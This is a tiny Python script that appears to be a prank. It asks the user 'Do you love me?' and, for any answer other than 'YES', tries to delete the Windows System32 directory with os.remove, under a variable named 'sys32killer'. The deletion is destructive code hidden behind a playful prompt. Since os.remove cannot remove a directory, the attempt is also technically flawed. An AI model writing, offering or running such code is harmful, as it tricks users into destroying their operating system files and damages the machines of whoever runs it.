import os

sys32killer = input("Do you love me?: ")

if sys32killer == ("YES"):
    print("Thanks bro!")
else:
    os.remove("C:/Windows/System32")